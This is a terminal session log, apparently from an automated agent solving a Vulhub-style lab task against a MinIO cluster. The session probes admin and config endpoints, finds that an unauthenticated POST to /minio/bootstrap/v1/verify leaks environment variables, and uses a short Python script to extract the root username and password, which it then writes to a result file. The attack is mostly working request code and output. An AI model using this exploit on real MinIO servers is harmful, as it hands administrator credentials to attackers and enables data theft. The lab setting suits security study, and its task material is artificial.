@@ -1,0 +1,469 @@
+root@3c9f439430d5:/app# export GIT_PAGER=cat PAGER=cat GIT_TERMINAL_PROMPT=0
+root@3c9f439430d5:/app# set +e
+root@3c9f439430d5:/app#
+root@3c9f439430d5:/app# APT_MIRROR="http://mirrors.ustc.edu.cn/debian"
+root@3c9f439430d5:/app# APT_SECURITY_MIRROR="http://mirrors.ustc.edu.cn/debian-security"
+root@3c9f439430d5:/app# UV_INDEX_URL="https://pypi.org/simple"
+root@3c9f439430d5:/app#
+root@3c9f439430d5:/app# if [ -f /etc/apt/sources.list ]; then
+>     cp /etc/apt/sources.list /etc/apt/sources.list.bak || true
+>     sed -i \
+>         -e "s|http://deb.debian.org/debian|${APT_MIRROR}|g" \
+>         -e "s|https://deb.debian.org/debian|${APT_MIRROR}|g" \
+>         -e "s|http://security.debian.org/debian-security|${APT_SECURITY_MIRROR}|g" \
+>         -e "s|https://security.debian.org/debian-security|${APT_SECURITY_MIRROR}|g" \
+>         /etc/apt/sources.list
+> fi
+root@3c9f439430d5:/app#
+root@3c9f439430d5:/app# if [ -f /etc/apt/sources.list.d/debian.sources ]; then
+>     cp /etc/apt/sources.list.d/debian.sources /etc/apt/sources.list.d/debian.sources.bak || true
+>     sed -i \
+>         -e "s|http://deb.debian.org/debian|${APT_MIRROR}|g" \
+>         -e "s|https://deb.debian.org/debian|${APT_MIRROR}|g" \
+>         -e "s|http://security.debian.org/debian-security|${APT_SECURITY_MIRROR}|g" \
+>         -e "s|https://security.debian.org/debian-security|${APT_SECURITY_MIRROR}|g" \
+>         /etc/apt/sources.list.d/debian.sources
+> fi
+root@3c9f439430d5:/app#
+root@3c9f439430d5:/app# mkdir -p /root/.config/uv
+root@3c9f439430d5:/app# cat > /root/.config/uv/uv.toml <<EOF
+> index-url = "${UV_INDEX_URL}"
+> EOF
+root@3c9f439430d5:/app#
+root@3c9f439430d5:/app# apt-get update || true
+Get:1 http://archive.ubuntu.com/ubuntu noble InRelease [256 kB]
+Get:2 http://security.ubuntu.com/ubuntu noble-security InRelease [126 kB]
+Get:3 http://archive.ubuntu.com/ubuntu noble-updates InRelease [126 kB]
+Get:4 http://archive.ubuntu.com/ubuntu noble-backports InRelease [126 kB]
+Get:5 http://archive.ubuntu.com/ubuntu noble/universe amd64 Packages [19.3 MB]
+Get:6 http://security.ubuntu.com/ubuntu noble-security/main amd64 Packages [1211 kB]
+Get:7 http://security.ubuntu.com/ubuntu noble-security/restricted amd64 Packages [1730 kB]
+Get:8 http://security.ubuntu.com/ubuntu noble-security/multiverse amd64 Packages [50.0 kB]
+Get:9 http://security.ubuntu.com/ubuntu noble-security/universe amd64 Packages [1529 kB]
+Get:10 http://archive.ubuntu.com/ubuntu noble/multiverse amd64 Packages [331 kB]
+Get:11 http://archive.ubuntu.com/ubuntu noble/restricted amd64 Packages [117 kB]
+Get:12 http://archive.ubuntu.com/ubuntu noble/main amd64 Packages [1808 kB]
+Get:13 http://archive.ubuntu.com/ubuntu noble-updates/main amd64 Packages [1532 kB]
+Get:14 http://archive.ubuntu.com/ubuntu noble-updates/universe amd64 Packages [2150 kB]
+Get:15 http://archive.ubuntu.com/ubuntu noble-updates/restricted amd64 Packages [1852 kB]
+Get:16 http://archive.ubuntu.com/ubuntu noble-updates/multiverse amd64 Packages [55.8 kB]
+Get:17 http://archive.ubuntu.com/ubuntu noble-backports/multiverse amd64 Packages [671 B]
+Get:18 http://archive.ubuntu.com/ubuntu noble-backports/universe amd64 Packages [35.9 kB]
+Get:19 http://archive.ubuntu.com/ubuntu noble-backports/main amd64 Packages [48.9 kB]
+Fetched 32.4 MB in 15s (2143 kB/s)
+Reading package lists... Done
+root@3c9f439430d5:/app# true; tmux wait -S done
+root@3c9f439430d5:/app# export GIT_PAGER=cat PAGER=cat GIT_TERMINAL_PROMPT=0
+root@3c9f439430d5:/app# set -o pipefail
+root@3c9f439430d5:/app# ( curl -sS -i --max-time 5 http://node1:9000/ | sed -n '1,80p' ) 2>&1
+bash: curl: command not found
+root@3c9f439430d5:/app# printf '\n--- health ---\n'
+
+--- health ---
+root@3c9f439430d5:/app# ( curl -sS -i --max-time 5 http://node1:9000/minio/health/live | sed -n '1,80p' ) 2>&1
+bash: curl: command not found
+root@3c9f439430d5:/app# printf '\n--- env endpoint guesses ---\n'
+
+--- env endpoint guesses ---
+root@3c9f439430d5:/app# for p in /minio/config/v1 /minio/config/v1/config /minio/admin/v3/info /minio/admin/v3/config /debug/vars /.env /config.json; do echo "#
+## $p"; curl -sS -i --max-time 3 "http://node1:9000$p" | sed -n '1,40p'; done
+### /minio/config/v1
+bash: curl: command not found
+### /minio/config/v1/config
+bash: curl: command not found
+### /minio/admin/v3/info
+bash: curl: command not found
+### /minio/admin/v3/config
+bash: curl: command not found
+### /debug/vars
+bash: curl: command not found
+### /.env
+bash: curl: command not found
+### /config.json
+bash: curl: command not found
+root@3c9f439430d5:/app# true; tmux wait -S done
+root@3c9f439430d5:/app# export GIT_PAGER=cat PAGER=cat GIT_TERMINAL_PROMPT=0
+root@3c9f439430d5:/app# python3 - <<'PY'
+> import http.client
+> host='node1'; port=9000
+> paths=['/','/minio/health/live','/minio/health/ready','/minio/config/v1','/minio/config/v1/config','/minio/admin/v3/info','/minio/admin/v3/config','/debug/var
+s','/.env','/config.json']
+> for p in paths:
+>     print('\n###',p)
+>     try:
+>         conn=http.client.HTTPConnection(host,port,timeout=5)
+>         conn.request('GET',p)
+>         r=conn.getresponse()
+>         data=r.read(2000)
+>         print(r.status, r.reason)
+>         for k,v in r.getheaders(): print(f'{k}: {v}')
+>         print(data[:1000].decode('utf-8','replace'))
+>         conn.close()
+>     except Exception as e:
+>         print('ERR',repr(e))
+> PY
+
+### /
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 254
+Content-Security-Policy: block-all-mixed-content
+Content-Type: application/xml
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+Vary: Accept-Encoding
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C678502E1820
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied.</Message><Resource>/</Resource><RequestId>18D1C678502E1820</RequestId><HostId>e3b0c44298fc1c149afbf4c899
+6fb92427ae41e4649b934ca495991b7852b855</HostId></Error>
+
+### /minio/health/live
+200 OK
+Accept-Ranges: bytes
+Content-Length: 0
+Content-Security-Policy: block-all-mixed-content
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C678505970C0
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+
+
+### /minio/health/ready
+200 OK
+Accept-Ranges: bytes
+Content-Length: 0
+Content-Security-Policy: block-all-mixed-content
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67850758FD1
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+
+
+### /minio/config/v1
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 226
+Content-Type: application/xml
+Server: MinIO
+Vary: Origin
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AllAccessDisabled</Code><Message>All access to this resource has been disabled.</Message><Resource>/minio/config/v1</Resource><RequestId></RequestI
+d><HostId></HostId></Error>
+
+### /minio/config/v1/config
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 233
+Content-Type: application/xml
+Server: MinIO
+Vary: Origin
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AllAccessDisabled</Code><Message>All access to this resource has been disabled.</Message><Resource>/minio/config/v1/config</Resource><RequestId></R
+equestId><HostId></HostId></Error>
+
+### /minio/admin/v3/info
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 192
+Content-Security-Policy: block-all-mixed-content
+Content-Type: application/json
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+Vary: Accept-Encoding
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67850C45C27
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+{"Code":"AccessDenied","Message":"Access Denied.","Resource":"/minio/admin/v3/info","RequestId":"18D1C67850C45C27","HostId":"e3b0c44298fc1c149afbf4c8996fb92427a
+e41e4649b934ca495991b7852b855"}
+
+
+### /minio/admin/v3/config
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 194
+Content-Security-Policy: block-all-mixed-content
+Content-Type: application/json
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+Vary: Accept-Encoding
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67850E25D9F
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+{"Code":"AccessDenied","Message":"Access Denied.","Resource":"/minio/admin/v3/config","RequestId":"18D1C67850E25D9F","HostId":"e3b0c44298fc1c149afbf4c8996fb9242
+7ae41e4649b934ca495991b7852b855"}
+
+
+### /debug/vars
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 309
+Content-Security-Policy: block-all-mixed-content
+Content-Type: application/xml
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+Vary: Accept-Encoding
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67850FC1CAF
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied.</Message><Key>vars</Key><BucketName>debug</BucketName><Resource>/debug/vars</Resource><RequestId>18D1C67
+850FC1CAF</RequestId><HostId>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</HostId></Error>
+
+### /.env
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 287
+Content-Security-Policy: block-all-mixed-content
+Content-Type: application/xml
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+Vary: Accept-Encoding
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C678528AECB6
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied.</Message><BucketName>.env</BucketName><Resource>/.env</Resource><RequestId>18D1C678528AECB6</RequestId><
+HostId>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</HostId></Error>
+
+### /config.json
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 301
+Content-Security-Policy: block-all-mixed-content
+Content-Type: application/xml
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+Vary: Accept-Encoding
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67854115431
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:47 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied.</Message><BucketName>config.json</BucketName><Resource>/config.json</Resource><RequestId>18D1C6785411543
+1</RequestId><HostId>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</HostId></Error>
+root@3c9f439430d5:/app# true; tmux wait -S done
+root@3c9f439430d5:/app# export GIT_PAGER=cat PAGER=cat GIT_TERMINAL_PROMPT=0
+root@3c9f439430d5:/app# python3 - <<'PY'
+> import http.client, json
+> host='node1'; port=9000
+> checks=[
+>     ('GET','/minio/bootstrap/v1/verify',None,{}),
+>     ('POST','/minio/bootstrap/v1/verify',b'',{}),
+>     ('POST','/minio/bootstrap/v1/verify',b'{}',{'Content-Type':'application/json'}),
+>     ('GET','/minio/bootstrap/v1/health',None,{}),
+>     ('POST','/minio/bootstrap/v1/health',b'',{}),
+>     ('GET','/minio/server/health/live',None,{}),
+>     ('GET','/minio/v2/metrics/cluster',None,{}),
+>     ('GET','/minio/v2/metrics/node',None,{}),
+> ]
+> for method,path,body,headers in checks:
+>     print('\n###', method, path)
+>     try:
+>         conn=http.client.HTTPConnection(host,port,timeout=5)
+>         conn.request(method,path,body=body,headers=headers)
+>         r=conn.getresponse()
+>         data=r.read(8000)
+>         print(r.status, r.reason)
+>         for k,v in r.getheaders(): print(f'{k}: {v}')
+>         print(data.decode('utf-8','replace')[:4000])
+>         conn.close()
+>     except Exception as e:
+>         print('ERR',repr(e))
+> PY
+
+### GET /minio/bootstrap/v1/verify
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 236
+Content-Type: application/xml
+Server: MinIO
+Vary: Origin
+Date: Thu, 03 Sep 2026 09:45:58 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AllAccessDisabled</Code><Message>All access to this resource has been disabled.</Message><Resource>/minio/bootstrap/v1/verify</Resource><RequestId>
+</RequestId><HostId></HostId></Error>
+
+### POST /minio/bootstrap/v1/verify
+200 OK
+Content-Security-Policy: block-all-mixed-content
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67B0628B249
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:58 GMT
+Content-Length: 1107
+Content-Type: text/plain; charset=utf-8
+{"MinioEndpoints":[{"Legacy":true,"SetCount":1,"DrivesPerSet":3,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"node1:9000","Path":"/mnt/data1","R
+awPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"nod
+e2:9000","Path":"/mnt/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Op
+aque":"","User":null,"Host":"node3:9000","Path":"/mnt/data3","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLo
+cal":false}],"CmdLine":"http://node1:9000/mnt/data1 http://node2:9000/mnt/data2 http://node3:9000/mnt/data3","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{
+"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_ROOT_PASSWORD":"minioadmin-vulhub"
+,"MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"minioadmin","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key"}}
+
+
+### POST /minio/bootstrap/v1/verify
+200 OK
+Content-Security-Policy: block-all-mixed-content
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67B064198E4
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:58 GMT
+Content-Length: 1107
+Content-Type: text/plain; charset=utf-8
+{"MinioEndpoints":[{"Legacy":true,"SetCount":1,"DrivesPerSet":3,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"node1:9000","Path":"/mnt/data1","R
+awPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"nod
+e2:9000","Path":"/mnt/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Op
+aque":"","User":null,"Host":"node3:9000","Path":"/mnt/data3","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLo
+cal":false}],"CmdLine":"http://node1:9000/mnt/data1 http://node2:9000/mnt/data2 http://node3:9000/mnt/data3","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{
+"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_ROOT_PASSWORD":"minioadmin-vulhub"
+,"MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"minioadmin","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key"}}
+
+
+### GET /minio/bootstrap/v1/health
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 236
+Content-Type: application/xml
+Server: MinIO
+Vary: Origin
+Date: Thu, 03 Sep 2026 09:45:58 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AllAccessDisabled</Code><Message>All access to this resource has been disabled.</Message><Resource>/minio/bootstrap/v1/health</Resource><RequestId>
+</RequestId><HostId></HostId></Error>
+
+### POST /minio/bootstrap/v1/health
+200 OK
+Content-Security-Policy: block-all-mixed-content
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67B0685AF42
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:58 GMT
+Content-Length: 0
+
+
+### GET /minio/server/health/live
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 235
+Content-Type: application/xml
+Server: MinIO
+Vary: Origin
+Date: Thu, 03 Sep 2026 09:45:58 GMT
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AllAccessDisabled</Code><Message>All access to this resource has been disabled.</Message><Resource>/minio/server/health/live</Resource><RequestId><
+/RequestId><HostId></HostId></Error>
+
+### GET /minio/v2/metrics/cluster
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 252
+Content-Security-Policy: block-all-mixed-content
+Content-Type: application/json
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67B06B513C3
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:58 GMT
+{"Code":"AccessDenied","Message":"Access Denied. (Authentication failed, check your access credentials)","Resource":"/minio/v2/metrics/cluster","RequestId":"18D
+1C67B06B513C3","HostId":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
+
+
+### GET /minio/v2/metrics/node
+403 Forbidden
+Accept-Ranges: bytes
+Content-Length: 249
+Content-Security-Policy: block-all-mixed-content
+Content-Type: application/json
+Server: MinIO
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Origin
+X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+X-Amz-Request-Id: 18D1C67B06CC312C
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Date: Thu, 03 Sep 2026 09:45:58 GMT
+{"Code":"AccessDenied","Message":"Access Denied. (Authentication failed, check your access credentials)","Resource":"/minio/v2/metrics/node","RequestId":"18D1C6
+7B06CC312C","HostId":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
+
+root@3c9f439430d5:/app# true; tmux wait -S done
+root@3c9f439430d5:/app# export GIT_PAGER=cat PAGER=cat GIT_TERMINAL_PROMPT=0
+root@3c9f439430d5:/app# python3 - <<'PY'
+> import http.client, json
+> conn=http.client.HTTPConnection('node1',9000,timeout=5)
+> conn.request('POST','/minio/bootstrap/v1/verify',body=b'')
+> r=conn.getresponse()
+> data=r.read().decode('utf-8','replace')
+> conn.close()
+> obj=json.loads(data)
+> env=obj.get('MinioEnv',{})
+> print('MINIO_ROOT_USER=' + env.get('MINIO_ROOT_USER',''))
+> print('MINIO_ROOT_PASSWORD=' + env.get('MINIO_ROOT_PASSWORD',''))
+> PY
+MINIO_ROOT_USER=minioadmin
+MINIO_ROOT_PASSWORD=minioadmin-vulhub
+root@3c9f439430d5:/app# true; tmux wait -S done
+root@3c9f439430d5:/app# export GIT_PAGER=cat PAGER=cat GIT_TERMINAL_PROMPT=0
+root@3c9f439430d5:/app# python3 - /app/result.txt <<'PY'
+> import os
+> import sys
+> path = sys.argv[1]
+> content = 'MINIO_ROOT_USER=minioadmin\nMINIO_ROOT_PASSWORD=minioadmin-vulhub\n'
+> dir_path = os.path.dirname(path)
+> if dir_path:
+>     os.makedirs(dir_path, exist_ok=True)
+> try:
+>     with open(path, 'w', encoding='utf-8', newline='\n') as f:
+>         f.write(content)
+>     print(f"成功: 已写入 {path}")
+> except Exception as exc:
+>     print(f"写入失败: {exc}")
+> PY
+成功: 已写入 /app/result.txt
+root@3c9f439430d5:/app# true; tmux wait -S done
+root@3c9f439430d5:/app# export GIT_PAGER=cat PAGER=cat GIT_TERMINAL_PROMPT=0
+root@3c9f439430d5:/app# if [ -f /app/result.txt ]; then cat -- /app/result.txt; else echo '错误: 找不到文件 /app/result.txt'; fi
+MINIO_ROOT_USER=minioadmin
+MINIO_ROOT_PASSWORD=minioadmin-vulhub
+root@3c9f439430d5:/app# true; tmux wait -S done
+root@3c9f439430d5:/app#
